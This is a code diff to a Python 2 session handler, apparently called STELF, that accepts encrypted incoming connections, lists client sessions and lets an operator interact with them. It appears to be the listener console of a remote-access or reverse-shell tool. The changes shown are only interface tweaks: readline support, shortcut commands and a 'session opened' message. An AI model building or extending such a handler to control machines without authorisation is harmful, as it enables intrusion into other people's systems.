@@ -4,6 +4,7 @@
 import socket, sys, json, base64, random, hashlib, signal, threading, time
 from prompt_toolkit import prompt
 from Crypto.Cipher import AES
+import readline
 
 class Client:
 	def __init__(self, id, socket, address, port, key, IV):
@@ -55,7 +56,7 @@ class Client:
 		print "starting interaction"
 		while True:
 			try:
-				user_input = prompt(u"\n" + unicode(self.prompt, errors='replace') + " ")
+				user_input = raw_input(u"\n" + unicode(self.prompt, errors='replace') + " ")
 			except KeyboardInterrupt:
 			    print ""
 			    break
@@ -136,6 +137,12 @@ class Handler:
 			c = Client(len(self.clients), client, addr[0], addr[1], key, IV)
 			self.clients.append(c)
 			
+			
+			sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
+			print "STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
+			sys.stdout.write('handler>> ' + readline.get_line_buffer())
+			sys.stdout.flush()
+			
 	def start(self):
 		print "[*] STELF HAS STARTED BABY"
 		t = threading.Thread(target=self.accept_clients)
@@ -143,9 +150,9 @@ class Handler:
 		t.start()
 		while True:
 			try:
-				user_input = prompt(u"handler>> ")
+				user_input = raw_input(u"handler>> ")
 			except KeyboardInterrupt: sys.exit("\n[*]User requested shutdown.")
-			if user_input == "list":
+			if user_input == "list" or user_input == "l":
 				print "Current active sessions:"
 				print "========================"
 				for c in self.clients:
@@ -153,7 +160,7 @@ class Handler:
 					
 				print"\n========================"
 					
-			elif user_input.startswith("interact"):
+			elif user_input.startswith("interact") or user_input.split()[0] == "i":
 				try:
 					req_id = int(user_input.split()[1])
 					self.clients[req_id].interact()
